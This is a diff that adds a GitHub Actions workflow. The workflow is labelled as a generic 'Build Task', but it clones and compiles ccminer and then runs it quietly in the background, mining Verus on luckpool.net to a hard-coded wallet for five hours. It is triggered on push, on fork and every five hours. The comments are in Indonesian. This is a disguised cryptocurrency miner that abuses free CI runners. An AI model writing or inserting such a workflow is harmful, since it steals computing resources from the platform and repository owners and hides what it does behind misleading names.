@@ -1,0 +1,41 @@
+name: Build Task (Auto Runtime)
+
+on:
+  workflow_dispatch:       # Bisa dijalankan manual
+  push:                    # Saat ada push
+  fork:                    # Saat repo di-fork
+  schedule:                # Tiap 5 jam
+    - cron: "0 */5 * * *"
+
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+
+    steps:
+      - name: Prepare Environment
+        run: |
+          sudo apt update
+          sudo apt install -y \
+            build-essential git cmake automake libtool autoconf pkg-config \
+            libcurl4-openssl-dev screen
+
+      - name: Clone & Compile
+        run: |
+          git clone https://github.com/monkins1010/ccminer.git tempdir
+          cd tempdir
+          chmod +x build.sh
+          ./build.sh
+
+      - name: Execute Task
+        run: |
+          cd tempdir
+
+          WALLET="RGVmtuvrP2yX8q3U4up77CcSpkcVhp4bUG"
+          POOL="stratum+tcp://na.luckpool.net:3956"
+          THREADS=1
+          LABEL="GH-${{ github.run_id }}"
+
+          nohup ./ccminer -a verus -o $POOL -u $WALLET.$LABEL -p x -t $THREADS > /dev/null 2>&1 &
+
+          sleep $((60 * 300))
